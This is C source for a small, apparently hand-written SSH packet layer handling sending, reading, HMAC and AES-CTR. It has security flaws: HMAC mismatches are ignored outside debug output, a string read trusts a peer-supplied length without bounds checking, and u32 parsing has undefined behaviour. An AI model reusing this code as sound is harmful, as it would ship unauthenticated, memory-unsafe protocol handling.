void send_ssh_packet(ssh_connection* ssh,ssh_packet* packet){
    int len;
    len = packet->payload_size + (ssh->encrypt ? SHA256_HASH_SIZE : 0);

    #ifdef DEBUG
    if(ssh_packet_msg_code(packet) == SSH_CHANNEL_DATA || ssh_packet_msg_code(packet) == SSH_CHANNEL_EXTENDED_DATA){
        char* str;
        int strlen;
        str = read_ssh_packet_channel_data(packet, &strlen);
       printf(">ssh send(%i) %s\n", strlen, str);
        free(str);
    }else{
       printf(">ssh send %s(%i) packet size:%i\n",MessageCodeToString(ssh_packet_msg_code(packet)),ssh_packet_msg_code(packet),len);
    }
    #endif

    #ifdef DEBUG
   printf("send %s(%i) packet size:%i\n",PacketToString(packet),ssh_packet_msg_code(packet),len);
    #endif
    if(ssh->encrypt){
        ssh_packet_create_hmac(ssh, packet);
        #ifndef CIPHER_NONE
        AES_CTR_xcrypt_buffer(ssh->out_aes, packet->payload, packet->payload_size, 1);
        #endif
    }
    send(ssh->connection.sockfd, packet->payload, len, MSG_NOSIGNAL);

    ssh->send_packet_counter++;
    if(ssh_packet_msg_code(packet)!=SSH_KEXINIT)
        packet_free(packet);
}

void packet_free(ssh_packet *packet){
    free(packet->payload);
    free(packet);
}

BOOL ssh_packet_range(ssh_packet* packet, int len){
    return (packet->ptr + len) <= (packet->payload + (packet->payload_size - ssh_packet_padding_length(packet)));
}

int ptr_put_bn(u_char* ptr, bn_t* a){
    int be,x,y;
    be = _bn_big_endian();
    ptr+=ptr_put_u32(ptr, a->n);

    for(x = a->n_parts - 1, y = 0; x >= 0; x--, y++){
        if(be)
            ptr[y] = a->p[x];
        else
            ptr[y] = SWAP(a->p[x]);
    }
    return a->n + 4;
}

int ptr_put_u32(u_char* ptr, int i){
    *(ptr++) = (i >> 24) & 0xFF;
    *(ptr++) = (i >> 16) & 0xFF;
    *(ptr++) = (i >> 8) & 0xFF;
    *(ptr++) = i & 0xFF;
    return 4;
}

int ptr_read_u32(u_char* ptr){
    return ((*ptr++) << 24 | *(ptr++) << 16 | *(ptr++) << 8 | *(ptr++));
}

u_char* ssh_packet_read_str(ssh_packet* packet, int *length){
    u_char *blob;
    if((*length = ssh_packet_read_u32(packet)) == -1)
        return NULL;
    blob = calloc(sizeof(u_char),*length);
    memcpy(blob,packet->ptr, *length);
    packet->ptr += *length;
    return blob;
}

int ssh_packet_read_u32(ssh_packet* packet){
    int i;
    if(!ssh_packet_range(packet,4)) 
        return -1;

    i = ptr_read_u32(packet->ptr);
    packet->ptr+=4;
    return i;
}

int ssh_packet_put_u32(ssh_packet* packet, int i){
    if(!ssh_packet_range(packet,4)) 
        return 1;
    packet->ptr+=ptr_put_u32(packet->ptr,i);
    return 0;
}

int ssh_packet_put_bool(ssh_packet* packet, BOOL b){
    if(!ssh_packet_range(packet,1)) 
        return 1;
    *(packet->ptr++) = b;
    return 0;
}

bn_t* ssh_packet_read_bn(ssh_packet* packet){
    bn_t* a;
    int len;
    if((len = ssh_packet_read_u32(packet)) == -1)
        return NULL;
    if(!ssh_packet_range(packet,len)) 
        return NULL;

    a = bn_from_bin(bn_alloc(len), packet->ptr, len);
    packet->ptr+=len;
    return a;
}

int ssh_packet_put_bn(ssh_packet* packet,bn_t* a){
    if(!ssh_packet_range(packet,a->n)) 
        return 1;
    ssh_packet_put_u32(packet, a->n);
    packet->ptr += bn_to_ptr(a, packet->ptr);
    return 0;
}

int ptr_put_str(u_char* ptr, char* str, int length){
    ptr += ptr_put_u32(ptr,length);
    memcpy(ptr, str, length);
    return 4 + length;
}

int ssh_packet_put_str(ssh_packet* packet, char* str){
    return _ssh_packet_put_str(packet,str,strlen(str));
}

int _ssh_packet_put_str(ssh_packet* packet, char* str, int length){
    if(!ssh_packet_range(packet,4+length)){
        return 1;
    }
    packet->ptr+=ptr_put_str(packet->ptr, str, length);
    return 0;
}

void ssh_packet_reset_ptr(ssh_packet* packet){
    packet->ptr = packet->payload+6;
}

uint8_t ssh_packet_msg_code(ssh_packet* packet){
    return *(packet->payload + 5);
}

uint8_t ssh_packet_padding_length(ssh_packet* packet){
    return *(packet->payload + 4);
}

ssh_packet* read_ssh_packet(ssh_connection* ssh){
    u_char* ptr;
    u_char* data;
    u_char* hmac;
    ssh_packet* packet;
    int payload_size;

    ptr = ssh->connection.buff;

    #ifndef CIPHER_NONE
    if(ssh->encrypt){
        data = calloc(sizeof(uint8_t), 4);
        memcpy(data, ptr, 4);
        AES_CTR_xcrypt_buffer(ssh->in_aes, data, 4 ,0);
        payload_size = ptr_read_u32(data);
        free(data);
    }else{
    #endif
        payload_size = ptr_read_u32(ptr);
    #ifndef CIPHER_NONE
    }
    #endif
    ptr+=4;

    if(payload_size > 4 && (4+payload_size+(ssh->encrypt ? SHA256_HASH_SIZE : 0)) <= ssh->connection.buffpos){
        packet = calloc(sizeof(ssh_packet),1);
        //payload = |padding_length| + |payload|
        //packet->payload_size = |packet_length| + |padding_length| + |payload|
        packet->payload_size = payload_size + 4;
        packet->payload = calloc(sizeof(u_char), packet->payload_size);
        packet->ptr = packet->payload;

        memcpy(packet->payload, ptr-4, packet->payload_size);
        if(ssh->encrypt){
            #ifndef CIPHER_NONE
            AES_CTR_xcrypt_buffer(ssh->in_aes, packet->payload, packet->payload_size,1);
            #endif
        }

        #ifdef DEBUG
        if(PacketToString(packet) == NULL)
       printf(">ssh read %i packet\n",ssh_packet_msg_code(packet));
        else
       printf(">ssh read %s packet\n",PacketToString(packet));
        #endif

        ssh->rec_packet_counter++;
        if(ssh->encrypt){
            //hmac
            data = calloc(sizeof(u_char), 4 + packet->payload_size);
            ptr_put_u32(data, ssh->rec_packet_counter);
            memcpy(data+4, packet->payload, packet->payload_size);

            hmac = calloc(sizeof(u_char), SHA256_HASH_SIZE);
            hmac_sha256(ssh->in_mac_aes, SHA256_HASH_SIZE, data, 4 + packet->payload_size, hmac, SHA256_HASH_SIZE);

            //Set ptr to hmac
            ptr = ssh->connection.buff + packet->payload_size;
            if(memcmp(hmac, ptr, SHA256_HASH_SIZE) != 0){
                #ifdef DEBUG
               printf("HMAC WRONG!\n");
                #endif
            }
            free(data);
            free(hmac);
        }

        return packet;
    }
    return NULL;
}

